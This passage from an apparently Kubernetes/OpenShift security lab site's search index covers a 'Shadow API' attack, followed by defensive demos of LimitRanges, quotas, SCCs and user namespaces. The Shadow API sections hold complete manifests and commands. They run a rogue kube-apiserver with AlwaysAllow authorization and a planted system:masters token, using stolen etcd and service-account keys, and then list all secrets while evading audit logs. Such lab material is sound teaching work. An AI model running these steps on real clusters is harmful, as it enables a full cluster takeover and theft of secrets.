\"--allow-privileged=true\"\n      - \"--service-account-issuer=https://kubernetes.default.svc.cluster.local\"\n      - \"--service-account-key-file=/var/lib/rancher/rke2/server/tls/service.key\"\n      - \"--service-account-signing-key-file=/var/lib/rancher/rke2/server/tls/service.current.key\"\n      - \"--service-cluster-ip-range=$SERVICE_RANGE\"\n      - \"--cert-dir=/tmp/shadow-certs\"\n      - \"--advertise-address=$HOST_IP\"\n      - \"--encryption-provider-config=/var/lib/rancher/rke2/server/cred/encryption-config.json\"\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - name: rke2-tls\n      mountPath: /var/lib/rancher/rke2/server/tls\n      readOnly: true\n    - name: rke2-creds\n      mountPath: /var/lib/rancher/rke2/server/cred\n      readOnly: true\n    - name: token-vol\n      mountPath: /etc/shadow-token\n  volumes:\n  - name: rke2-tls\n    hostPath:\n      path: /var/lib/rancher/rke2/server/tls\n  - name: rke2-creds\n    hostPath:\n      path: /var/lib/rancher/rke2/server/cred\n  - name: token-vol\n    configMap:\n      name: shadow-token-cm\nEOF\n</code></pre>"},{"location":"admissioncontrols/ShadowAPI-rke2/#phase-3-verification-demo","title":"Phase 3: Verification &amp; Demo","text":"<p>The attacker uses the backdoor to act as a <code>system:masters</code> Cluster Admin.</p> <pre><code># 1. Create a persistent client pod (rancher/shell includes kubectl)\ncat &lt;&lt;EOF | kubectl --kubeconfig=dev-user.config apply -n dev-space -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: shadow-client\n  namespace: dev-space\nspec:\n  containers:\n  - name: shell\n    image: rancher/shell:v0.1.24\n    command: [\"sleep\", \"infinity\"]\n    env:\n    - name: HOST_IP\n      value: \"${HOST_IP}\"\nEOF\n\nkubectl --kubeconfig=dev-user.config get pods\n\n# 2. Exec into the client (Variables are pre-baked into the environment)\nkubectl --kubeconfig=dev-user.config exec -it shadow-client -n dev-space -- /bin/bash\n\n# INSIDE THE POD: Authenticate using the backdoor token on Port 16443\nkubectl --server=https://${HOST_IP}:16443 --token=shadow-token --insecure-skip-tls-verify get nodes\nkubectl --server=https://${HOST_IP}:16443 --token=shadow-token --insecure-skip-tls-verify get secrets -A\n</code></pre>"},{"location":"admissioncontrols/ShadowAPI-rke2/#final-step-lab-clean-up","title":"Final Step: Lab Clean Up","text":"<pre><code># 1. Delete the backdoor\nkubectl delete ns dev-space\n\n# 2. Harden the Cluster in /etc/rancher/rke2/config.yaml:\n# profile: \"cis-1.23\"\n</code></pre>"},{"location":"admissioncontrols/ShadowAPI/","title":"Total Cluster Takeover via Over-Privileged Misconfiguration","text":"<p>When security controls specifically Security Context Constraints (SCCs) and Pod Security Admissions (PSAs) are not strictly enforced, a single misconfiguration can be catastrophic. If a developer or a service account is granted the ability to deploy privileged containers on control plane nodes, the entire cluster\u2019s security model can be dismantled in seconds.</p> <p>Below is a demonstration of how a \"privileged\" SCC can be leveraged to create a Shadow API, leading to a total cluster takeover while completely bypassing standard auditing logs.</p>"},{"location":"admissioncontrols/ShadowAPI/#security-risk-overview-the-shadow-api-attack","title":"Security Risk Overview: The \"Shadow API\" Attack","text":"<ul> <li>Bypassing RBAC: By launching a secondary API server with <code>--authorization-mode=AlwaysAllow</code>, the attacker effectively deletes the cluster's permission model. Every request is granted \"God Mode\" regardless of who makes it.</li> <li>Audit Evasion: The shadow server listens on a non-standard port (16443). Because traffic to this port never passes through the official <code>kube-apiserver</code> process, no entries are recorded in the official OpenShift audit logs.</li> <li>Real-Time Data Mirroring: By mounting the host's <code>etcd</code> certificates and matching the <code>etcd-prefix</code>, the shadow server interacts with the live cluster database. It doesn't just see a copy; it sees and can modify the actual cluster state.</li> <li>Identity Theft: The attacker can use the node's own Service Account signing keys to mint their own identities, making the takeover persistent and difficult to detect.</li> </ul>"},{"location":"admissioncontrols/ShadowAPI/#the-end-to-end-lab","title":"The End-to-End Lab","text":"<p>To ensure this only runs where it has access to the database certs, we use nodeSelectors and tolerations to enforce that the Shadow API pod runs strictly on a Control Plane (Master) node.</p>"},{"location":"admissioncontrols/ShadowAPI/#prerequisites-create-namespace-with-privileged-scc","title":"Prerequisites: Create Namespace with Privileged SCC","text":"<p>First, log in as the cluster administrator:</p> <pre><code>oc login -u kubeadmin https://api.crc.testing:6443\n</code></pre> <p>Create the namespace and grant the necessary privileged Security Context Constraints (SCC):</p> <pre><code>oc create namespace demo-kube\noc adm policy add-scc-to-user privileged -z default -n demo-kube\noc adm policy add-role-to-user admin developer -n demo-kube\n</code></pre> <p>Capture the exact production API image and service network range <pre><code>export API_IMAGE=$(oc get pods -n openshift-kube-apiserver -l apiserver=true -o jsonpath='{.items[0].spec.containers[0].image}')\nexport SERVICE_RANGE=$(oc get networks.config.openshift.io cluster -o jsonpath='{.spec.serviceNetwork[0]}')\n</code></pre></p> <p>Switch to the developer user to proceed with the bypass as a restricted user:</p> <pre><code>oc login -u developer https://api.crc.testing:6443\n</code></pre>"},{"location":"admissioncontrols/ShadowAPI/#step-1-automated-lab-deployment","title":"Step 1: Automated Lab Deployment","text":"<p>This script captures your cluster's specific API image and network configuration to ensure the \"Shadow API\" is a perfect binary match.</p> <pre><code># 1. Deploy the Shadow API (The Mirror)\ncat &lt;&lt;EOF | oc apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: ocp-shadow-api\n  namespace: demo-kube\n  labels:\n    app: ocp-shadow-api\nspec:\n  nodeSelector:\n    node-role.kubernetes.io/master: \"\"\n  tolerations:\n  - key: \"node-role.kubernetes.io/master\"\n    operator: \"Exists\"\n    effect: \"NoSchedule\"\n  - key: \"node-role.kubernetes.io/control-plane\"\n    operator: \"Exists\"\n    effect: \"NoSchedule\"\n  hostNetwork: true\n  containers:\n  - name: shadow-api\n    image: $API_IMAGE\n    command: [\"/bin/bash\", \"-c\"]\n    args:\n      - |\n        echo \"shadow-token,shadow-admin,1000,\\\"system:masters\\\"\" &gt; /tmp/token-file.csv\n        REAL_CA=\\$(find /etc/kubernetes/static-pod-resources -name \"ca-bundle.crt\" | grep \"etcd\" | head -n 1)\n        REAL_CERT=\\$(find /etc/kubernetes/static-pod-resources -name \"etcd-peer-*.crt\" | head -n 1)\n        REAL_KEY=\\$(echo \\$REAL_CERT | sed 's/\\.crt/\\.key/')\n        REAL_SA_KEY=\\$(find /etc/kubernetes/static-pod-resources -name \"service-account.key\" | grep \"bound\" | head -n 1)\n        REAL_SA_PUB=\\$(find /etc/kubernetes/static-pod-resources -name \"service-account.pub\" | grep \"bound\" | head -n 1)\n\n        exec kube-apiserver \\\\\n          --etcd-servers=https://127.0.0.1:2379 \\\\\n          --etcd-cafile=\"\\$REAL_CA\" \\\\\n          --etcd-certfile=\"\\$REAL_CERT\" \\\\\n          --etcd-keyfile=\"\\$REAL_KEY\" \\\\\n          --etcd-prefix=kubernetes.io \\\\\n          --storage-media-type=application/vnd.kubernetes.protobuf \\\\\n          --secure-port=16443 \\\\\n          --token-auth-file=/tmp/token-file.csv \\\\\n          --authorization-mode=AlwaysAllow \\\\\n          --allow-privileged=true \\\\\n          --service-account-issuer=https://kubernetes.default.svc \\\\\n          --service-account-key-file=\"\\$REAL_SA_PUB\" \\\\\n          --service-account-signing-key-file=\"\\$REAL_SA_KEY\" \\\\\n          --service-cluster-ip-range=$SERVICE_RANGE\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - name: master-resources\n      mountPath: /etc/kubernetes/static-pod-resources\n      readOnly: true\n  volumes:\n  - name: master-resources\n    hostPath:\n      path: /etc/kubernetes/static-pod-resources\nEOF\n\n# 2. Deploy Service &amp; Configured Kubeconfig\ncat &lt;&lt;EOF | oc apply -f -\napiVersion: v1\nkind: Service\nmetadata:\n  name: shadow-api-svc\n  namespace: demo-kube\nspec:\n  selector:\n    app: ocp-shadow-api\n  ports:\n  - protocol: TCP\n    port: 443\n    targetPort: 16443\n---\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: shadow-kubeconfig\n  namespace: demo-kube\ndata:\n  config: |\n    apiVersion: v1\n    kind: Config\n    clusters:\n    - cluster:\n        insecure-skip-tls-verify: true\n        server: https://shadow-api-svc.demo-kube.svc.cluster.local\n      name: shadow-cluster\n    contexts:\n    - context:\n        cluster: shadow-cluster\n        user: shadow-admin\n      name: shadow-context\n    current-context: shadow-context\n    users:\n    - name: shadow-admin\n      user:\n        token: shadow-token\nEOF\n\n# 3. Deploy the Shadow Client\ncat &lt;&lt;EOF | oc apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: shadow-client\n  namespace: demo-kube\nspec:\n  containers:\n  - name: tools\n    image: registry.redhat.io/openshift4/ose-cli-rhel9:latest\n    command: [\"/bin/sh\", \"-c\", \"sleep infinity\"]\n    env:\n    - name: KUBECONFIG\n      value: /etc/shadow-config/config\n    volumeMounts:\n    - name: kubeconfig-vol\n      mountPath: /etc/shadow-config\n      readOnly: true\n  volumes:\n  - name: kubeconfig-vol\n    configMap:\n      name: shadow-kubeconfig\nEOF\n</code></pre>"},{"location":"admissioncontrols/ShadowAPI/#verification-and-demo","title":"Verification and Demo","text":"<ol> <li> <p>Access the Backdoor: <pre><code>oc exec -it shadow-client -n demo-kube -- /bin/bash\n</code></pre></p> </li> <li> <p>Execute Administrative Actions: <pre><code>oc get nodes\noc get namespaces\n</code></pre></p> </li> </ol>"},{"location":"admissioncontrols/ShadowAPI/#final-step-lab-clean-up","title":"Final Step: Lab Clean Up","text":"<p>Once you have completed the demonstration, delete the namespace and the SCC permissions to ensure the backdoor is closed. You must perform this as kubeadmin.</p> <pre><code># Login as cluster admin\noc login -u kubeadmin https://api.crc.testing:6443\n\n# Remove the namespace (this deletes all pods, services, and configmaps)\noc delete namespace demo-kube\n\n# Revoke the privileged SCC from the developer-owned service account\noc adm policy remove-scc-from-user privileged -z default -n demo-kube\n</code></pre>"},{"location":"admissioncontrols/ShadowAPI/#attack-flow-visualization","title":"Attack Flow Visualization","text":"<pre><code>graph TD\n    subgraph \"Exploitation Entrypoint\"\n        User[\"Developer / Restricted User\"]\n        Access[\"Namespace Access&lt;br/&gt;(demo-kube)\"]\n        SA[\"ServiceAccount with Privileged SCC&lt;br/&gt;(Already Assigned by Admin)\"]\n\n        User --&gt; Access\n        Access --&gt; SA\n    end\n\n    subgraph \"The Pivot (Escape Path)\"\n        PrivPod[\"Deployment of Privileged Pod\"]\n        MasterNode[\"Control Plane Node Affinity\"]\n\n        SA -- \"1. Use 'privileged' SCC\" --&gt; PrivPod\n        PrivPod -- \"2. Schedule on Master\" --&gt; MasterNode\n    end\n\n    subgraph \"The Breach (Master Node Host)\"\n        HostCerts[\"/etc/kubernetes/static-pod-resources&lt;br/&gt;(Etcd &amp; SA Keys)\"]\n        Etcd[(\"Live Etcd Database\")]\n\n        PrivPod -- \"3. Mount Host Volume\" --&gt; HostCerts\n        PrivPod -- \"4. Connect to Local Etcd\" --&gt; Etcd\n    end\n\n    subgraph \"The Shadow API (Backdoor)\"\n        ShadowAPI[\"kube-apiserver&lt;br/&gt;(AlwaysAllow Mode)\"]\n        Service[\"Shadow Service&lt;br/&gt;(Cluster Internal)\"]\n\n        PrivPod -- \"5. Run Secondary API\" --&gt; ShadowAPI\n        ShadowAPI -- \"6. Disable RBAC/Audit\" --&gt; Service\n    end\n\n    subgraph \"Total Takeover\"\n        ClientPod[\"Shadow Client (oc)\"]\n        ClientPod -- \"7. Admin Command via Service\" --&gt; Service\n        Service -- \"8. Unrestricted Etcd Access\" --&gt; Etcd\n    end\n\n    %% Styling\n    style SA fill:#fff3cd,stroke:#856404,stroke-width:2px\n    style PrivPod fill:#f8d7da,stroke:#721c24,stroke-width:2px,stroke-dasharray: 5 5\n    style ShadowAPI fill:#f00,color:#fff,stroke-width:2px\n    style Etcd fill:#e2e3e5,stroke:#383d41,stroke-width:3px\n    style ClientPod fill:#004085,color:#fff</code></pre>"},{"location":"admissioncontrols/limits/","title":"LimitRanges","text":"<p>This guide demonstrates how to verify and test LimitRanges in OpenShift. A LimitRange is a \"Day 0\" guardrail that ensures every container has a resource request/limit, even if the developer forgets to define one.</p>"},{"location":"admissioncontrols/limits/#demo-verifying-resource-guardrails-limitranges","title":"Demo: Verifying Resource Guardrails (LimitRanges)","text":"<p>In this demo, we will prove that our Project Factory successfully enforces container sizes by deploying a \"naked\" pod (one without any resource definitions) and watching OpenShift automatically intervene.</p>"},{"location":"admissioncontrols/limits/#1-verify-the-governance-is-active","title":"1. Verify the Governance is Active","text":"<p>First, ensure that the <code>LimitRange</code> we injected via our custom template is actually present in the project.</p> <pre><code># Check the rules in your project\noc get limitrange project-limits -n secure-app-demo -o yaml\n</code></pre> <p>What to look for:</p> <ul> <li><code>defaultRequest</code>: The \"floor\" (what the pod is guaranteed). We set this to 200m CPU and 512Mi RAM.</li> <li><code>default</code>: The \"ceiling\" (the limit). We set this to 500m CPU and 1Gi RAM.</li> </ul>"},{"location":"admissioncontrols/limits/#2-deploy-a-naked-pod","title":"2. Deploy a \"Naked\" Pod","text":"<p>We will now deploy a standard Nginx pod. Notice that we are not specifying any CPU or Memory requests in the command.</p> <pre><code># Deploy a simple pod without resource definitions\noc run naked-pod --image=nginx -n secure-app-demo\n</code></pre>"},{"location":"admissioncontrols/limits/#3-the-reveal-inspect-the-auto-injection","title":"3. The Reveal: Inspect the Auto-Injection","text":"<p>Because the <code>LimitRange</code> is active, the OpenShift Admission Controller intercepted the creation of this pod and \"patched\" it with our corporate defaults before it was allowed to run.</p> <pre><code># Inspect the pod's resources\noc get pod naked-pod -n secure-app-demo -o jsonpath='{.spec.containers[0].resources}' | jq\n</code></pre>"},{"location":"admissioncontrols/limits/#expected-output","title":"Expected Output:","text":"<pre><code>{\n  \"limits\": {\n    \"cpu\": \"500m\",\n    \"memory\": \"1Gi\"\n  },\n  \"requests\": {\n    \"cpu\": \"200m\",\n    \"memory\": \"512Mi\"\n  }\n}\n</code></pre>"},{"location":"admissioncontrols/limits/#4-testing-the-hard-ceiling-the-max-limit","title":"4. Testing the \"Hard Ceiling\" (The Max Limit)","text":"<p>Our blueprint also defined a Max Limit (2 CPUs and 2Gi RAM). Let's see what happens if a developer tries to create a \"Mega-Pod\" that exceeds this.</p> <pre><code># Attempt to create a pod that is too large (3 CPUs)\noc run greedy-pod --image=nginx --requests='cpu=3' -n secure-app-demo\n</code></pre>"},{"location":"admissioncontrols/limits/#expected-result","title":"Expected Result:","text":"<p>The command will fail with an error similar to this:</p> <p><code>Error from server (Forbidden): pods \"greedy-pod\" is forbidden: maximum cpu usage per Container is 2, but request is 3.</code></p>"},{"location":"admissioncontrols/limits/#5-key-takeaways-for-the-audience","title":"5. Key Takeaways for the Audience","text":"<ul> <li>Invisible Protection: The developer doesn't need to know the rules; the cluster enforces them silently.</li> <li>Standardization: Every pod in the project now has a predictable footprint, making capacity planning much easier.</li> <li>Prevention: We have effectively prevented a single developer from accidentally (or intentionally) consuming more resources than their project is allowed.</li> </ul>"},{"location":"admissioncontrols/limits/#6-cleanup","title":"6. Cleanup","text":"<pre><code>oc delete pod naked-pod -n secure-app-demo\n</code></pre>"},{"location":"admissioncontrols/quota/","title":"Resource Quotas","text":"<p>This guide demonstrates how to verify and test Resource Quotas in OpenShift. While a LimitRange controls individual containers, a ResourceQuota acts as the \"Total Budget\" for the entire project, preventing one team from consuming all the physical resources of the cluster.</p>"},{"location":"admissioncontrols/quota/#demo-verifying-the-project-budget-resource-quotas","title":"Demo: Verifying the Project Budget (Resource Quotas)","text":"<p>In this demo, we will simulate a \"Resource Exhaustion\" scenario. We will attempt to deploy multiple applications until we hit the project's hard ceiling (4 CPUs / 8Gi RAM), proving that OpenShift will block any requests that exceed the allocated budget.</p>"},{"location":"admissioncontrols/quota/#1-verify-the-active-budget","title":"1. Verify the Active Budget","text":"<p>Before we start, let's check the current consumption of our project.</p> <pre><code># Check the quota status in your project\noc get quota project-quota -n secure-app-demo\n</code></pre> <p>What to look for:</p> <ul> <li><code>Used</code>: How much the team is currently consuming.</li> <li><code>Hard</code>: The maximum allowed (4 CPUs and 8Gi RAM).</li> </ul>"},{"location":"admissioncontrols/quota/#2-trigger-the-noisy-neighbor-scenario","title":"2. Trigger the \"Noisy Neighbor\" Scenario","text":"<p>We will use a deployment to quickly scale up our resource usage. We will create a deployment where each pod is forced to use a specific amount of memory.</p> <pre><code># Create a deployment with 3 replicas, each requesting 2Gi of RAM\n# Total request: 6Gi (This fits within our 8Gi budget)\noc create deployment heavy-app --image=nginx -n secure-app-demo\noc set resources deployment heavy-app --requests='memory=2Gi,cpu=1' -n secure-app-demo\noc scale deployment heavy-app --replicas=3 -n secure-app-demo\n</code></pre>"},{"location":"admissioncontrols/quota/#3-the-budget-breach-attempt","title":"3. The \"Budget Breach\" Attempt","text":"<p>Now, we will try to scale the deployment to 5 replicas.</p> <ul> <li>Total requested memory: 10Gi (5 pods x 2Gi).</li> <li>Our Project Limit: 8Gi.</li> </ul> <pre><code># Attempt to scale beyond the project budget\noc scale deployment heavy-app --replicas=5 -n secure-app-demo\n</code></pre>"},{"location":"admissioncontrols/quota/#4-the-reveal-inspecting-the-admission-failure","title":"4. The Reveal: Inspecting the Admission Failure","text":"<p>OpenShift will accept the scale command, but the ResourceQuota Admission Controller will prevent the additional pods from actually being created.</p> <pre><code># Check the Deployment status\noc describe deployment heavy-app -n secure-app-demo\n</code></pre>"},{"location":"admissioncontrols/quota/#expected-result","title":"Expected Result:","text":"<p>You will see a \"FailedCreate\" warning in the events:</p> <p><code>Error creating: pods \"heavy-app-...\" is forbidden: exceeded quota: project-quota, requested: memory=2Gi, used: memory=6Gi, limited: memory=8Gi</code></p>"},{"location":"admissioncontrols/quota/#5-key-takeaways-for-the-audience","title":"5. Key Takeaways for the Audience","text":"<ul> <li>Financial/Operational Safety: Quotas ensure that a \"leaky\" app or a runaway script in one project cannot impact the stability of other teams' projects.</li> <li>Deterministic Behavior: The cluster remains stable because it refuses to \"overcommit\" physical resources beyond what was promised to the project.</li> <li>Self-Service with Guardrails: Developers have the freedom to scale their apps, but only within the boundaries of their pre-approved \"Resource Budget.\"</li> </ul>"},{"location":"admissioncontrols/quota/#6-cleanup","title":"6. Cleanup","text":"<pre><code># Delete the deployment to free up the quota\noc delete deployment heavy-app -n secure-app-demo\n</code></pre> <p>Would you like me to show you how to create a ClusterResourceQuota, which allows you to set a single budget that is shared across multiple projects (e.g., all projects belonging to the \"Finance\" team)?</p>"},{"location":"admissioncontrols/scc/","title":"SCC Fundamentals","text":"<p>Security Context Constraints (SCCs) are one of the most powerful security features in OpenShift. While RBAC defines who can do something, SCCs define what a pod can actually do (e.g., can it run as root? can it access the host network?).</p> <p>This demo shows how OpenShift protects the cluster by blocking a \"privileged\" container and how we safely grant permission using a ServiceAccount.</p>"},{"location":"admissioncontrols/scc/#demo-hardening-pod-privileges-sccs","title":"Demo: Hardening Pod Privileges (SCCs)","text":"<p>In this demo, we will attempt to run a pod that requires \"Root\" privileges. We will see OpenShift block it by default and then walk through the Proper way to allow it using a dedicated ServiceAccount.</p>"},{"location":"admissioncontrols/scc/#1-the-standard-security-posture","title":"1. The \"Standard\" Security Posture","text":"<p>By default, OpenShift uses the <code>restricted-v2</code> SCC. This policy:</p> <ul> <li>Prevents pods from running as the root user.</li> <li>Forces pods to use a unique, non-privileged User ID (UID).</li> <li>Prevents access to the host's file system or network.</li> </ul>"},{"location":"admissioncontrols/scc/#2-the-failure-attempting-to-run-as-root","title":"2. The Failure: Attempting to Run as Root","text":"<p>We will try to run a standard <code>fedora</code> image and force it to run as the root user (UID 0).</p> <pre><code># Attempt to run a pod as root\noc run root-pod --image=fedora --overrides='{\"spec\":{\"securityContext\":{\"runAsUser\":0}}}' -n secure-app-demo\n</code></pre>"},{"location":"admissioncontrols/scc/#the-reveal-inspect-the-block","title":"The Reveal: Inspect the Block","text":"<p>OpenShift will accept the command, but the pod will fail to enter a \"Running\" state.</p> <pre><code># Check the pod status\noc get pod root-pod -n secure-app-demo\n</code></pre> <p>Expected Result: The pod will stay in <code>CreateContainerConfigError</code> or <code>CrashLoopBackOff</code>. If you describe the pod, you will see:</p> <p><code>Error: container's runAsUser breaks non-root policy (pod has uid 0, but must have non-zero uid)</code></p>"},{"location":"admissioncontrols/scc/#3-the-proper-way-using-a-serviceaccount","title":"3. The \"Proper\" Way: Using a ServiceAccount","text":"<p>We never want to grant \"Root\" access to a whole project or a human user. Instead, we grant it to a specific ServiceAccount (the pod's identity).</p>"},{"location":"admissioncontrols/scc/#step-a-create-the-identity","title":"Step A: Create the Identity","text":"<pre><code># Create a dedicated ServiceAccount for this specific workload\noc create sa root-service-app -n secure-app-demo\n</code></pre>"},{"location":"admissioncontrols/scc/#step-b-bind-the-scc-to-the-serviceaccount","title":"Step B: Bind the SCC to the ServiceAccount","text":"<p>We will grant this specific identity the <code>anyuid</code> SCC, which allows the pod to choose its own User ID (including 0).</p> <pre><code># Grant the 'anyuid' SCC to the ServiceAccount\noc adm policy add-scc-to-user anyuid -z root-service-app -n secure-app-demo\n</code></pre>"},{"location":"admissioncontrols/scc/#4-the-success-running-with-the-new-identity","title":"4. The Success: Running with the New Identity","text":"<p>Now, we run the same pod again, but this time we tell it to use our authorized <code>root-service-app</code> identity.</p> <pre><code># Run the pod using the authorized ServiceAccount\noc run root-pod-fixed --image=fedora \\\n  --serviceaccount=root-service-app \\\n  --overrides='{\"spec\":{\"securityContext\":{\"runAsUser\":0}}}' \\\n  -n secure-app-demo\n</code></pre>"},{"location":"admissioncontrols/scc/#verification","title":"Verification","text":"<pre><code># Check if the pod is running\noc get pod root-pod-fixed -n secure-app-demo\n\n# Verify the user inside the container is actually root\noc exec root-pod-fixed -n secure-app-demo -- whoami\n</code></pre> <p>Expected Output: <code>root</code></p>"},{"location":"admissioncontrols/scc/#5-key-takeaways-for-the-audience","title":"5. Key Takeaways for the Audience","text":"<ul> <li>Default Deny: OpenShift is secure by default. Even if a developer pushes a \"root-required\" image, the cluster will block it unless explicitly authorized.</li> <li>Least Privilege: We didn't make the developer an admin. We gave a ServiceAccount just enough permission to run that one specific workload.</li> <li>Audit Trail: By using ServiceAccounts, security teams can run a single command to see exactly which applications have elevated privileges: <pre><code>oc get scc anyuid -o yaml\n</code></pre></li> </ul>"},{"location":"admissioncontrols/scc/#6-cleanup","title":"6. Cleanup","text":"<pre><code>oc delete pod root-pod root-pod-fixed -n secure-app-demo\noc delete sa root-service-app -n secure-app-demo\n</code></pre>"},{"location":"admissioncontrols/usernamespaces/","title":"User Namespaces Demo","text":"<p>This is the definitive, end-to-end lab for User Namespaces on OpenShift, based on the official documentation and verified by your previous tests.</p> <p>This lab proves that pods running as either UID 1000 or UID 0 (root) inside the container are remapped to massive, unprivileged UIDs on the host worker node, effectively \"jailing\" the processes.</p>"},{"location":"admissioncontrols/usernamespaces/#scc-philosophy-understanding-the-boundaries","title":"SCC Philosophy: Understanding the Boundaries","text":"<p>In this lab, you are interacting with two specific Security Context Constraints (SCCs). While they look similar, they have very different philosophies regarding what a container is allowed to do.</p>"},{"location":"admissioncontrols/usernamespaces/#1-restricted-v3","title":"1. <code>restricted-v3</code>","text":"<p>This is the default scc for User Namespaces. It is designed for maximum security by assuming the container should have no special powers.</p> <ul> <li>Privilege Escalation (<code>false</code>): It strictly forbids a process from ever gaining more privileges than it started with.</li> <li>Capabilities (<code>NET_BIND_SERVICE</code> only): It only allows the container to bind to \"low\" ports (like 80). It explicitly forbids <code>SETUID</code> and <code>SETGID</code>.</li> <li>The Goal: To protect the host from \"escapes.\" Even if a pod is compromised, the attacker is stuck as a low-privileged user with no ability to change their identity.</li> </ul>"},{"location":"admissioncontrols/usernamespaces/#2-nested-container","title":"2. <code>nested-container</code>","text":"<p>This SCC is specifically designed for workloads that need to act like root (like Podman-in-Podman or legacy Web Servers) but are safely wrapped inside a User Namespace.</p> <ul> <li>Privilege Escalation (<code>true</code>): It allows the process to change its identity (e.g., from root to <code>www-data</code>).</li> <li>Allowed Capabilities (<code>SETUID</code>, <code>SETGID</code>): It permits the two specific powers needed to switch user identities.</li> <li>The Safety Catch: While it looks \"looser\" than <code>restricted-v3</code>, it is actually very safe because OpenShift generally requires <code>hostUsers: false</code> to be set for this SCC to be effective.</li> <li>The Goal: To allow \"root-like\" behavior without actually giving the process any power over the physical host node.</li> </ul>"},{"location":"admissioncontrols/usernamespaces/#lab-user-namespaces-v3","title":"Lab: User Namespaces (v3)","text":""},{"location":"admissioncontrols/usernamespaces/#1-cluster-admin-prepare-the-security-boundary","title":"1. Cluster-Admin: Prepare the Security Boundary","text":"<p>The cluster administrator must define the remapped ID ranges and grant the user/service account the rights to use the specific User Namespace SCCs.</p> <pre><code># A. Create the project and assign 'user001' as the admin\noc new-project userns-lab\noc adm policy add-role-to-user admin user001 -n userns-lab\n\n# B. Configure the UID/GID remapping range (Official Requirement)\n# This annotation tells CRI-O to map internal IDs starting at 0 (root) through 1000+.\noc patch namespace userns-lab --type='merge' -p '\n{\n  \"metadata\": {\n    \"annotations\": {\n      \"openshift.io/sa.scc.uid-range\": \"0/10000\",\n      \"openshift.io/sa.scc.supplemental-groups\": \"0/10000\"\n    }\n  }\n}'\n\n# C. Grant the SCCs to the default ServiceAccount\n# restricted-v3: Standard isolation.\n# nested-container: Allows SETUID/SETGID (needed for apps like httpd).\noc adm policy add-scc-to-user restricted-v3 -z default -n userns-lab\noc adm policy add-scc-to-user nested-container -z default -n userns-lab\n</code></pre>"},{"location":"admissioncontrols/usernamespaces/#2-user001-deploy-the-isolated-pods","title":"2. user001: Deploy the Isolated Pods","text":"<p>Acting as user001, we will deploy two scenarios: a standard non-root user and a \"safe\" root user.</p> <p>Scenario A: Standard Non-Root (UID 1000)</p> <pre><code>cat &lt;&lt;EOF | oc apply -f - --as=user001\napiVersion: v1\nkind: Pod\nmetadata:\n  name: userns-pod\n  namespace: userns-lab\nspec:\n  hostUsers: false  # &lt;--- THE MAGIC SWITCH: Triggers User Namespace\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  containers:\n  - name: userns-container\n    image: registry.access.redhat.com/ubi9:latest\n    command: [\"sleep\", \"infinity\"]\n    securityContext:\n      runAsUser: 1000\n      runAsGroup: 1000\n      runAsNonRoot: true\n      procMount: Unmasked\nEOF\n</code></pre> <p>Scenario B: Safe Root Apache (httpd) This container starts as root internally to bind port 80 and uses <code>SETUID</code>/<code>SETGID</code> to drop privileges, but remains unprivileged on the host.</p> <pre><code>cat &lt;&lt;EOF | oc apply -f - --as=user001\napiVersion: v1\nkind: Pod\nmetadata:\n  name: userns-httpd\n  namespace: userns-lab\nspec:\n  hostUsers: false\n  containers:\n  - name: apache\n    image: docker.io/library/httpd:latest\n    securityContext:\n      runAsUser: 0\n      runAsGroup: 0\n      runAsNonRoot: false\n      allowPrivilegeEscalation: true\n      capabilities:\n        add: [\"SETGID\", \"SETUID\"]\nEOF\n</code></pre>"},{"location":"admissioncontrols/usernamespaces/#3-verification-the-double-reality","title":"3. Verification: The Double Reality","text":"<p>Step A: Inside Reality (The Pod's view) Verify that the processes see their intended internal IDs.</p> <pre><code># Check the non-root pod\noc exec userns-pod -n userns-lab -- id\n# Output: uid=1000(1000) gid=1000(1000)\n\n# Check the httpd root pod\noc exec userns-httpd -n userns-lab -- id\n# Output: uid=0(root) gid=0(root)\n</code></pre> <p>Step B: Host Reality (The Security view) Reveal the true identities on the host node for both containers.</p> <pre><code># 1. Identify the worker nodes\nHTTPD_ROOT=$(oc get pod userns-httpd -n userns-lab -o jsonpath='{.spec.nodeName}')\n\n# 2. Run the targeted host inspection for the Root HTTPD Pod\noc debug node/$HTTPD_ROOT -q -- chroot /host /bin/sh -c \"\n  CONT_ID=\\$(crictl ps --name apache -q | head -n 1)\n  PID=\\$(crictl inspect \\$CONT_ID | grep '\\\"pid\\\":' | head -n 1 | awk -F: '{print \\$2}' | tr -d ' ,')\n\n  echo '--- HTTPD HOST SYSTEM VIEW ---'\n  ls -ld /proc/\\$PID | awk '{print \\\"Host-Level UID: \\\" \\$3 \\\" (Remapped Root)\\\"}'\n\"\n</code></pre>"},{"location":"admissioncontrols/usernamespaces/#final-analysis","title":"Final Analysis","text":"<ul> <li>Result: You will see UIDs like <code>3938583528</code> or <code>2147483648</code>.</li> <li>The Difference: Inside the pod, the process thinks it is 1000 or 0. On the host, it is 3.9 Billion or 2.1 Billion.</li> <li>The Security Win: If a vulnerability (like a container escape) were found in the kernel, the attacker would land on the host as an ID that doesn't exist in <code>/etc/passwd</code>. They would have zero permissions to read files, modify system settings, or interfere with other tenants.</li> </ul>"},{"location":"admissioncontrols/usernamespaces/#why-this-lab-is-critical","title":"Why this lab is critical","text":"<p>By using <code>user001</code> and the specific User Namespace SCCs (<code>restricted-v3</code> and <code>nested-container</code>), you have successfully implemented Least Privilege + Defense in Depth. You have demonstrated that OpenShift can safely run legacy \"root\" applications by cryptographically isolating their identity from the underlying host.</p>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/","title":"Defense in Depth: Understanding the Protection Layers","text":"<p>In a secure container platform, defense in depth is achieved through multiple independent layers of security. This lab demonstrates how OpenShift leverages Linux kernel primitives to enforce isolation.</p>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#core-concepts-the-three-layers","title":"Core Concepts: The Three Layers","text":""},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#1-discretionary-access-control-dac","title":"1. Discretionary Access Control (DAC)","text":"<p>\"The User's Perspective\"</p> <p>This is the standard Linux permission model (<code>rwx</code>, <code>chown</code>, <code>chmod</code>) based on UID/GID.</p> <ul> <li>Rule: \"Does User 1000 have permission to read this file owned by User 1000?\"</li> <li>Weakness: If a user exploits a process and gains the right UID, they can access the data.</li> 